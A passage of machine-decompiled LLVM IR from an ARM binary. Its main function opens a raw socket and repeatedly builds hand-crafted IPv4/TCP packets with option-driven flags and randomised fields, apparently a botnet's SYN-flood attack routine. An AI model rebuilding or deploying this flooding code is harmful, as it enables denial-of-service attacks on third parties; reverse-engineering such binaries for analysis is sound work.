  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 6, 4, 7, 5, 8, 9, 10, 12, 11, 14, 13, 15, 17, 16, 18, 19, 20, 22, 21, 27, 23, 24, 25, 26, 31, 28, 29, 30, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aef0, { 1, 0 }
  uselistorder label %dec_label_pc_aed8, { 1, 0 }
  uselistorder label %dec_label_pc_ad60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_acdc, { 1, 0 }
  uselistorder label %dec_label_pc_accc, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_af1c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_af1c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_af1c = load i32, i32* @r4, align 4
  %v24_af1c = load i32, i32* @fp, align 4
  %v27_af1c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_af38 = call i32 @function_1215c(i32 %arg1, i32 4)
  %v0_af3c = load i32, i32* @r5, align 4
  store i32 %v0_af3c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_af38, i32* @sb, align 4
  %v0_af4c = load i32, i32* @r4, align 4
  store i32 %v0_af4c, i32* %r0.global-to-local, align 4
  %v5_af50 = inttoptr i32 %v0_af3c to i32*
  %v6_af50 = call i32 @function_8570(i32 %v0_af4c, i32* %v5_af50, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_af68 = load i32, i32* @r5, align 4
  store i32 %v0_af68, i32* %r1.global-to-local, align 4
  %v0_af6c = load i32, i32* @r4, align 4
  store i32 %v0_af6c, i32* %r0.global-to-local, align 4
  %v5_af70 = trunc i32 %v6_af50 to i8
  %v6_af74 = inttoptr i32 %v0_af68 to i32*
  %v7_af74 = call i32 @function_8570(i32 %v0_af6c, i32* %v6_af74, i32 3, i32 65535, i32 %v6_af50)
  %v0_af78 = load i32, i32* @r5, align 4
  store i32 %v0_af78, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_af88 = load i32, i32* @r4, align 4
  store i32 %v0_af88, i32* %r0.global-to-local, align 4
  %v5_af8c = inttoptr i32 %v0_af78 to i32*
  %v6_af8c = call i32 @function_8570(i32 %v0_af88, i32* %v5_af8c, i32 4, i32 64, i32 %v7_af74)
  %v1_af94 = urem i32 %v6_af8c, 256
  %v0_af98 = load i32, i32* @r5, align 4
  store i32 %v0_af98, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_afa4 = load i32, i32* @r4, align 4
  store i32 %v0_afa4, i32* %r0.global-to-local, align 4
  %v6_afac = inttoptr i32 %v0_af98 to i32*
  %v7_afac = call i32 @function_8570(i32 %v0_afa4, i32* %v6_afac, i32 5, i32 1, i32 %v1_af94)
  %v1_afb8 = urem i32 %v7_afac, 256
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_afc4 = load i32, i32* @r5, align 4
  store i32 %v0_afc4, i32* %r1.global-to-local, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r0.global-to-local, align 4
  %v5_afd0 = inttoptr i32 %v0_afc4 to i32*
  %v6_afd0 = call i32 @function_8570(i32 %v0_afc8, i32* %v5_afd0, i32 6, i32 65535, i32 %v1_afb8)
  %v0_afd8 = load i32, i32* @r5, align 4
  store i32 %v0_afd8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_afd0, i32* %fp.global-to-local, align 4
  %v0_afe8 = load i32, i32* @r4, align 4
  store i32 %v0_afe8, i32* %r0.global-to-local, align 4
  %v5_afec = inttoptr i32 %v0_afd8 to i32*
  %v6_afec = call i32 @function_8570(i32 %v0_afe8, i32* %v5_afec, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_aff4 = load i32, i32* @r5, align 4
  store i32 %v0_aff4, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v6_afec, i32* @r6, align 4
  %v0_b004 = load i32, i32* @r4, align 4
  store i32 %v0_b004, i32* %r0.global-to-local, align 4
  %v5_b008 = inttoptr i32 %v0_aff4 to i32*
  %v6_b008 = call i32 @function_8570(i32 %v0_b004, i32* %v5_b008, i32 17, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_b00c = load i32, i32* @r5, align 4
  store i32 %v0_b00c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b01c = load i32, i32* @r4, align 4
  store i32 %v0_b01c, i32* %r0.global-to-local, align 4
  %v5_b020 = inttoptr i32 %v0_b00c to i32*
  %v6_b020 = call i32 @function_8570(i32 %v0_b01c, i32* %v5_b020, i32 18, i32 0, i32 %v6_b008)
  %v0_b024 = load i32, i32* @r5, align 4
  store i32 %v0_b024, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b034 = load i32, i32* @r4, align 4
  store i32 %v0_b034, i32* %r0.global-to-local, align 4
  %v5_b038 = inttoptr i32 %v0_b024 to i32*
  %v6_b038 = call i32 @function_8570(i32 %v0_b034, i32* %v5_b038, i32 11, i32 0, i32 %v6_b020)
  %v0_b03c = load i32, i32* @r5, align 4
  store i32 %v0_b03c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b04c = load i32, i32* @r4, align 4
  store i32 %v0_b04c, i32* %r0.global-to-local, align 4
  %v5_b050 = inttoptr i32 %v0_b03c to i32*
  %v6_b050 = call i32 @function_8570(i32 %v0_b04c, i32* %v5_b050, i32 12, i32 0, i32 %v6_b038)
  %v0_b054 = load i32, i32* @r5, align 4
  store i32 %v0_b054, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b064 = load i32, i32* @r4, align 4
  store i32 %v0_b064, i32* %r0.global-to-local, align 4
  %v5_b068 = inttoptr i32 %v0_b054 to i32*
  %v6_b068 = call i32 @function_8570(i32 %v0_b064, i32* %v5_b068, i32 13, i32 0, i32 %v6_b050)
  %v0_b06c = load i32, i32* @r5, align 4
  store i32 %v0_b06c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b07c = load i32, i32* @r4, align 4
  store i32 %v0_b07c, i32* %r0.global-to-local, align 4
  %v5_b080 = inttoptr i32 %v0_b06c to i32*
  %v6_b080 = call i32 @function_8570(i32 %v0_b07c, i32* %v5_b080, i32 14, i32 0, i32 %v6_b068)
  %v0_b084 = load i32, i32* @r5, align 4
  store i32 %v0_b084, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b094 = load i32, i32* @r4, align 4
  store i32 %v0_b094, i32* %r0.global-to-local, align 4
  %v5_b098 = inttoptr i32 %v0_b084 to i32*
  %v6_b098 = call i32 @function_8570(i32 %v0_b094, i32* %v5_b098, i32 15, i32 1, i32 %v6_b080)
  %v0_b09c = load i32, i32* @r5, align 4
  store i32 %v0_b09c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0ac = load i32, i32* @r4, align 4
  store i32 %v0_b0ac, i32* %r0.global-to-local, align 4
  %v5_b0b0 = inttoptr i32 %v0_b09c to i32*
  %v6_b0b0 = call i32 @function_8570(i32 %v0_b0ac, i32* %v5_b0b0, i32 16, i32 0, i32 %v6_b098)
  %v2_b0bc = load i32, i32* @global_var_20a5c.46, align 4
  store i32 %v2_b0bc, i32* %r3.global-to-local, align 4
  %v0_b0c0 = load i32, i32* @r5, align 4
  store i32 %v0_b0c0, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b0c8 = load i32, i32* @r4, align 4
  store i32 %v0_b0c8, i32* %r0.global-to-local, align 4
  %v5_b0cc = inttoptr i32 %v0_b0c0 to i32*
  %v6_b0cc = call i32 @function_8504(i32 %v0_b0c8, i32* %v5_b0cc, i32 25, i32 %v2_b0bc, i32 %v6_b0b0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b0e0 = call i32 @function_115f4(i32 2, i32 3, i32 6)
  store i32 %v3_b0e0, i32* %r0.global-to-local, align 4
  %v7_b0e4 = icmp eq i32 %v3_b0e0, -1
  store i1 %v7_b0e4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b0e0, i32* @sl, align 4
  br i1 %v7_b0e4, label %dec_label_pc_b5b8, label %dec_label_pc_b0f0

dec_label_pc_b0f0:                                ; preds = %dec_label_pc_af1c
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b0f8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b0f8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b10c = call i32 @function_115b0(i32 %v3_b0e0, i32 0, i32 3, i32 %v6_b0f8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b10c, i32* %r0.global-to-local, align 4
  %v7_b110 = icmp eq i32 %v5_b10c, -1
  store i1 %v7_b110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b110, label %dec_label_pc_b5b0, label %dec_label_pc_b118

dec_label_pc_b118:                                ; preds = %dec_label_pc_b0f0
  %v3_b120 = mul i32 %v7_af74, 65536
  store i32 %v3_b120, i32* %r0.global-to-local, align 4
  %v0_b124 = load i32, i32* %fp.global-to-local, align 4
  %v3_b124 = mul i32 %v0_b124, 65536
  store i32 %v3_b124, i32* %r4.global-to-local, align 4
  %v0_b128 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_b038, i32* %r2.global-to-local, align 4
  %v3_b134 = urem i32 %v7_af74, 65536
  store i32 %v3_b134, i32* %r3.global-to-local, align 4
  %v3_b138 = urem i32 %v0_b124, 65536
  %v3_b13c = urem i32 %v0_b128, 65536
  store i32 %v3_b13c, i32* %r1.global-to-local, align 4
  %v0_b140 = load i32, i32* @r7, align 4
  %v2_b140 = icmp eq i32 %v0_b140, 0
  store i1 %v2_b140, i1* %cpsr_z.global-to-local, align 1
  %v1_b150 = urem i32 %v6_b038, 256
  store i32 %v1_b150, i32* @fp, align 4
  br i1 %v2_b140, label %dec_label_pc_b3a4.preheader, label %dec_label_pc_b158

dec_label_pc_b158:                                ; preds = %dec_label_pc_b118
  %tmp52 = mul i32 %v6_b008, 256
  %v3_b170 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_af74, 256
  %v3_b174 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v6_b008, 256
  %v4_b17c = urem i32 %tmp54, 256
  %v5_b17c = or i32 %v4_b17c, %v3_b170
  store i32 %v5_b17c, i32* @lr, align 4
  %v1_b178 = mul i32 %v7_af74, 256
  %v4_b180 = and i32 %v1_b178, 65280
  %v5_b180 = or i32 %v4_b180, %v3_b174
  %tmp55 = mul i32 %v0_b124, 256
  %v3_b18c = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_b128, 256
  %v3_b190 = and i32 %tmp56, 65280
  %v1_b194 = urem i32 %v6_b038, 2
  %v1_b198 = urem i32 %v6_b050, 2
  %tmp57 = udiv i32 %v0_b124, 256
  %v4_b19c = urem i32 %tmp57, 256
  %v5_b19c = or i32 %v4_b19c, %v3_b18c
  store i32 %v5_b19c, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_b128, 256
  %v4_b1a0 = urem i32 %tmp58, 256
  %v5_b1a0 = or i32 %v4_b1a0, %v3_b190
  store i32 %v5_b1a0, i32* @r5, align 4
  %v1_b1bc = urem i32 %v6_b068, 2
  store i32 %v1_b1bc, i32* %r2.global-to-local, align 4
  %v1_b1c0 = urem i32 %v6_b080, 2
  store i32 %v1_b1c0, i32* %r3.global-to-local, align 4
  %v1_b1c4 = urem i32 %v6_b098, 2
  store i32 %v1_b1c4, i32* %r0.global-to-local, align 4
  %v1_b1c8 = urem i32 %v6_b0b0, 2
  store i32 %v1_b1c8, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_b180, 65536
  %v4_b250 = sdiv i32 %sext, 65536
  %tmp = sub nsw i32 0, %v1_b198
  %v4_b2b4 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_b1bc
  %v4_b2c8 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_b1c0
  %v4_b2e0 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_b1c4
  %v3_b2f4 = and i32 %tmp64, 2
  %v1_b244 = trunc i32 %v6_af8c to i8
  br label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %bb61, %dec_label_pc_b158
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_b1f0 = call i32 @function_1215c(i32 128, i32 1)
  store i32 %v2_b1f0, i32* %r0.global-to-local, align 4
  %v3_b1f4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b1f4, i32* %r2.global-to-local, align 4
  %v1_b1f8 = load i32, i32* @sb, align 4
  %v2_b1f8 = load i32, i32* @r4, align 4
  %v5_b1f8 = mul i32 %v2_b1f8, 4
  %v6_b1f8 = add i32 %v5_b1f8, %v1_b1f8
  %v7_b1f8 = inttoptr i32 %v6_b1f8 to i32*
  store i32 %v2_b1f0, i32* %v7_b1f8, align 4
  %v0_b1fc = load i32, i32* %r2.global-to-local, align 4
  %v3_b1fc = mul i32 %v0_b1fc, 32
  store i32 %v3_b1fc, i32* %r3.global-to-local, align 4
  %v0_b200 = load i32, i32* @sb, align 4
  %v4_b200 = mul i32 %v0_b1fc, 4
  %v5_b200 = add i32 %v0_b200, %v4_b200
  %v6_b200 = inttoptr i32 %v5_b200 to i32*
  %v7_b200 = load i32, i32* %v6_b200, align 4
  store i32 %v7_b200, i32* %r4.global-to-local, align 4
  %v5_b204 = mul i32 %v0_b1fc, 24
  store i32 %v5_b204, i32* %r3.global-to-local, align 4
  %v1_b208 = load i32, i32* @r8, align 4
  %v2_b208 = add i32 %v1_b208, %v5_b204
  store i32 %v2_b208, i32* %r0.global-to-local, align 4
  %v1_b20c = inttoptr i32 %v7_b200 to i8*
  %v2_b20c = load i8, i8* %v1_b20c, align 1
  %tmp65 = urem i8 %v2_b20c, 16
  %v1_b210 = zext i8 %tmp65 to i32
  %v1_b214 = or i32 %v1_b210, 64
  store i32 %v1_b214, i32* %r3.global-to-local, align 4
  %v1_b218 = trunc i32 %v1_b214 to i8
  store i8 %v1_b218, i8* %v1_b20c, align 1
  %v0_b21c = load i32, i32* %r4.global-to-local, align 4
  %v1_b21c = inttoptr i32 %v0_b21c to i8*
  %v2_b21c = load i8, i8* %v1_b21c, align 1
  %v1_b220 = and i8 %v2_b21c, -16
  %v1_b224 = or i8 %v1_b220, 5
  store i32 %v1_afb8, i32* %r3.global-to-local, align 4
  store i8 %v1_b224, i8* %v1_b21c, align 1
  %v2_b234 = load i32, i32* %r4.global-to-local, align 4
  %v3_b234 = add i32 %v2_b234, 1
  %v4_b234 = inttoptr i32 %v3_b234 to i8*
  store i8 %v5_af70, i8* %v4_b234, align 1
  store i32 %v1_af94, i32* %r2.global-to-local, align 4
  %v0_b23c = load i32, i32* %r3.global-to-local, align 4
  %v2_b23c = icmp eq i32 %v0_b23c, 0
  store i1 %v2_b23c, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_b244 = load i32, i32* %r4.global-to-local, align 4
  %v3_b244 = add i32 %v2_b244, 8
  %v4_b244 = inttoptr i32 %v3_b244 to i8*
  store i8 %v1_b244, i8* %v4_b244, align 1
  %v0_b248 = load i32, i32* %r3.global-to-local, align 4
  %v1_b248 = trunc i32 %v0_b248 to i16
  %v2_b248 = load i32, i32* %r4.global-to-local, align 4
  %v3_b248 = add i32 %v2_b248, 2
  %v4_b248 = inttoptr i32 %v3_b248 to i16*
  store i16 %v1_b248, i16* %v4_b248, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_b250, i32* %r1.global-to-local, align 4
  %v0_b254 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b254, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_b1e8
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_b1e8, %bb
  %v2_b258 = load i32, i32* %r4.global-to-local, align 4
  %v3_b258 = add i32 %v2_b258, 9
  %v4_b258 = inttoptr i32 %v3_b258 to i8*
  store i8 6, i8* %v4_b258, align 1
  %v0_b25c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b25c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_b25c = load i32, i32* %r2.global-to-local, align 4
  %v2_b25c = trunc i32 %v1_b25c to i16
  %v3_b25c = load i32, i32* %r4.global-to-local, align 4
  %v4_b25c = add i32 %v3_b25c, 6
  %v5_b25c = inttoptr i32 %v4_b25c to i16*
  store i16 %v2_b25c, i16* %v5_b25c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_b0cc, i32* %r2.global-to-local, align 4
  %v1_b264 = load i32, i32* %r4.global-to-local, align 4
  %v2_b264 = add i32 %v1_b264, 12
  %v3_b264 = inttoptr i32 %v2_b264 to i32*
  store i32 %v6_b0cc, i32* %v3_b264, align 4
  %v0_b268 = load i32, i32* %r0.global-to-local, align 4
  %v1_b268 = add i32 %v0_b268, 16
  %v2_b268 = inttoptr i32 %v1_b268 to i32*
  %v3_b268 = load i32, i32* %v2_b268, align 4
  store i32 %v3_b268, i32* %r3.global-to-local, align 4
  %v0_b26c = load i32, i32* %r1.global-to-local, align 4
  %v1_b26c = trunc i32 %v0_b26c to i16
  %v2_b26c = load i32, i32* %r4.global-to-local, align 4
  %v3_b26c = add i32 %v2_b26c, 4
  %v4_b26c = inttoptr i32 %v3_b26c to i16*
  store i16 %v1_b26c, i16* %v4_b26c, align 2
  %v0_b270 = load i32, i32* %r3.global-to-local, align 4
  %v1_b270 = load i32, i32* %r4.global-to-local, align 4
  %v2_b270 = add i32 %v1_b270, 16
  %v3_b270 = inttoptr i32 %v2_b270 to i32*
  store i32 %v0_b270, i32* %v3_b270, align 4
  %v0_b274 = load i32, i32* @r6, align 4
  %v1_b274 = trunc i32 %v0_b274 to i16
  %v2_b274 = load i32, i32* %r4.global-to-local, align 4
  %v3_b274 = add i32 %v2_b274, 20
  %v4_b274 = inttoptr i32 %v3_b274 to i16*
  store i16 %v1_b274, i16* %v4_b274, align 2
  %v0_b278 = load i32, i32* %r4.global-to-local, align 4
  %v1_b278 = add i32 %v0_b278, 20
  store i32 %v1_b278, i32* %r1.global-to-local, align 4
  %v1_b27c = add i32 %v0_b278, 32
  %v2_b27c = inttoptr i32 %v1_b27c to i8*
  %v3_b27c = load i8, i8* %v2_b27c, align 1
  %v4_b27c = zext i8 %v3_b27c to i32
  store i32 %v4_b27c, i32* %r3.global-to-local, align 4
  %v1_b280 = add i32 %v0_b278, 33
  %v2_b280 = inttoptr i32 %v1_b280 to i8*
  %v3_b280 = load i8, i8* %v2_b280, align 1
  %v4_b280 = zext i8 %v3_b280 to i32
  store i32 %v1_b194, i32* %r0.global-to-local, align 4
  %v1_b288 = urem i8 %v3_b27c, 16
  %v1_b28c = or i8 %v1_b288, -96
  %v1_b290 = and i32 %v4_b280, 223
  store i32 %v1_b290, i32* %r2.global-to-local, align 4
  store i8 %v1_b28c, i8* %v2_b27c, align 1
  %v0_b298 = load i32, i32* %r2.global-to-local, align 4
  %v1_b298 = load i32, i32* %r0.global-to-local, align 4
  %v4_b298 = mul i32 %v1_b298, 32
  %v5_b298 = or i32 %v4_b298, %v0_b298
  store i32 %v5_b298, i32* %r2.global-to-local, align 4
  store i32 %v5_b17c, i32* %r3.global-to-local, align 4
  %v1_b2a0 = trunc i32 %v5_b298 to i8
  %v2_b2a0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b2a0 = add i32 %v2_b2a0, 13
  %v4_b2a0 = inttoptr i32 %v3_b2a0 to i8*
  store i8 %v1_b2a0, i8* %v4_b2a0, align 1
  %v0_b2a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_b2a4 = add i32 %v1_b2a4, 4
  %v3_b2a4 = inttoptr i32 %v2_b2a4 to i32*
  store i32 %v0_b2a4, i32* %v3_b2a4, align 4
  %v0_b2a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2a8 = add i32 %v0_b2a8, 13
  %v2_b2a8 = inttoptr i32 %v1_b2a8 to i8*
  %v3_b2a8 = load i8, i8* %v2_b2a8, align 1
  %v4_b2a8 = zext i8 %v3_b2a8 to i32
  store i32 %v1_b198, i32* %r0.global-to-local, align 4
  %v1_b2b0 = and i32 %v4_b2a8, 239
  %v5_b2b4 = or i32 %v1_b2b0, %v4_b2b4
  store i32 %v5_b2b4, i32* %r3.global-to-local, align 4
  %v1_b2b8 = trunc i32 %v5_b2b4 to i8
  store i8 %v1_b2b8, i8* %v2_b2a8, align 1
  %v0_b2bc = load i32, i32* %r1.global-to-local, align 4
  %v1_b2bc = add i32 %v0_b2bc, 13
  %v2_b2bc = inttoptr i32 %v1_b2bc to i8*
  %v3_b2bc = load i8, i8* %v2_b2bc, align 1
  %v4_b2bc = zext i8 %v3_b2bc to i32
  store i32 %v1_b1bc, i32* %r3.global-to-local, align 4
  %v1_b2c4 = and i32 %v4_b2bc, 247
  %v5_b2c8 = or i32 %v1_b2c4, %v4_b2c8
  store i32 %v5_b2c8, i32* %r2.global-to-local, align 4
  %v0_b2cc = load i32, i32* @r5, align 4
  %v1_b2cc = trunc i32 %v0_b2cc to i16
  %v3_b2cc = add i32 %v0_b2bc, 2
  %v4_b2cc = inttoptr i32 %v3_b2cc to i16*
  store i16 %v1_b2cc, i16* %v4_b2cc, align 2
  %v0_b2d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2d0 = trunc i32 %v0_b2d0 to i8
  %v2_b2d0 = load i32, i32* %r1.global-to-local, align 4
  %v3_b2d0 = add i32 %v2_b2d0, 13
  %v4_b2d0 = inttoptr i32 %v3_b2d0 to i8*
  store i8 %v1_b2d0, i8* %v4_b2d0, align 1
  %v0_b2d4 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2d4 = add i32 %v0_b2d4, 13
  %v2_b2d4 = inttoptr i32 %v1_b2d4 to i8*
  %v3_b2d4 = load i8, i8* %v2_b2d4, align 1
  %v4_b2d4 = zext i8 %v3_b2d4 to i32
  store i32 %v1_b1c0, i32* %r0.global-to-local, align 4
  %v1_b2dc = and i32 %v4_b2d4, 251
  %v5_b2e0 = or i32 %v1_b2dc, %v4_b2e0
  store i32 %v5_b2e0, i32* %r3.global-to-local, align 4
  %v1_b2e4 = trunc i32 %v5_b2e0 to i8
  store i8 %v1_b2e4, i8* %v2_b2d4, align 1
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = add i32 %v0_b2e8, 13
  %v2_b2e8 = inttoptr i32 %v1_b2e8 to i8*
  %v3_b2e8 = load i8, i8* %v2_b2e8, align 1
  %v4_b2e8 = zext i8 %v3_b2e8 to i32
  store i32 %v1_b1c4, i32* %r3.global-to-local, align 4
  %v1_b2f0 = and i32 %v4_b2e8, 253
  %v4_b2f4 = or i32 %v1_b2f0, %v3_b2f4
  store i32 %v4_b2f4, i32* %r2.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v4_b2f4 to i8
  store i8 %v1_b2f8, i8* %v2_b2e8, align 1
  %v0_b2fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b2fc = add i32 %v0_b2fc, 13
  %v2_b2fc = inttoptr i32 %v1_b2fc to i8*
  %v3_b2fc = load i8, i8* %v2_b2fc, align 1
  %v4_b2fc = zext i8 %v3_b2fc to i32
  store i32 %v1_b1c8, i32* %r0.global-to-local, align 4
  %v1_b304 = and i32 %v4_b2fc, 254
  %v2_b308 = or i32 %v1_b304, %v1_b1c8
  store i32 %v2_b308, i32* %r3.global-to-local, align 4
  %v1_b30c = trunc i32 %v2_b308 to i8
  store i8 %v1_b30c, i8* %v2_b2fc, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_b318 = load i32, i32* %r4.global-to-local, align 4
  %v3_b318 = add i32 %v2_b318, 40
  %v4_b318 = inttoptr i32 %v3_b318 to i8*
  store i8 2, i8* %v4_b318, align 1
  %v0_b31c = load i32, i32* %r2.global-to-local, align 4
  %v1_b31c = trunc i32 %v0_b31c to i8
  %v2_b31c = load i32, i32* %r4.global-to-local, align 4
  %v3_b31c = add i32 %v2_b31c, 41
  %v4_b31c = inttoptr i32 %v3_b31c to i8*
  store i8 %v1_b31c, i8* %v4_b31c, align 1
  %v0_b320 = call i32 @function_e0b8()
  %v1_b324 = urem i32 %v0_b320, 16
  %v1_b328 = or i32 %v1_b324, 1392
  %tmp66 = mul nuw nsw i32 %v1_b328, 256
  %v3_b334 = add nuw nsw i32 %tmp66, 2048
  %v5_b33c = or i32 %v3_b334, 5
  %v1_b340 = trunc i32 %v5_b33c to i16
  %v2_b340 = load i32, i32* %r4.global-to-local, align 4
  %v3_b340 = add i32 %v2_b340, 42
  %v4_b340 = inttoptr i32 %v3_b340 to i16*
  store i16 %v1_b340, i16* %v4_b340, align 2
  %v2_b348 = load i32, i32* %r4.global-to-local, align 4
  %v3_b348 = add i32 %v2_b348, 44
  %v4_b348 = inttoptr i32 %v3_b348 to i8*
  store i8 4, i8* %v4_b348, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = add i32 %v2_b358, 46
  %v4_b358 = inttoptr i32 %v3_b358 to i8*
  store i8 8, i8* %v4_b358, align 1
  %v0_b35c = load i32, i32* %r2.global-to-local, align 4
  %v1_b35c = trunc i32 %v0_b35c to i8
  %v2_b35c = load i32, i32* %r4.global-to-local, align 4
  %v3_b35c = add i32 %v2_b35c, 47
  %v4_b35c = inttoptr i32 %v3_b35c to i8*
  store i8 %v1_b35c, i8* %v4_b35c, align 1
  %v0_b360 = load i32, i32* %r0.global-to-local, align 4
  %v1_b360 = trunc i32 %v0_b360 to i8
  %v2_b360 = load i32, i32* %r4.global-to-local, align 4
  %v3_b360 = add i32 %v2_b360, 45
  %v4_b360 = inttoptr i32 %v3_b360 to i8*
  store i8 %v1_b360, i8* %v4_b360, align 1
  %v0_b364 = call i32 @function_e0b8()
  store i32 %v0_b364, i32* %r0.global-to-local, align 4
  %v2_b36c = load i32, i32* %r4.global-to-local, align 4
  %v3_b36c = add i32 %v2_b36c, 59
  %v4_b36c = inttoptr i32 %v3_b36c to i8*
  store i8 6, i8* %v4_b36c, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_b37c = load i32, i32* %r4.global-to-local, align 4
  %v2_b37c = add i32 %v1_b37c, 48
  %v3_b37c = inttoptr i32 %v2_b37c to i32*
  store i32 %v0_b364, i32* %v3_b37c, align 4
  %v0_b380 = load i32, i32* %r3.global-to-local, align 4
  %v1_b380 = load i32, i32* %r4.global-to-local, align 4
  %v2_b380 = add i32 %v1_b380, 52
  %v3_b380 = inttoptr i32 %v2_b380 to i32*
  store i32 %v0_b380, i32* %v3_b380, align 4
  %v0_b384 = load i32, i32* %r2.global-to-local, align 4
  %v1_b384 = trunc i32 %v0_b384 to i8
  %v2_b384 = load i32, i32* %r4.global-to-local, align 4
  %v3_b384 = add i32 %v2_b384, 56
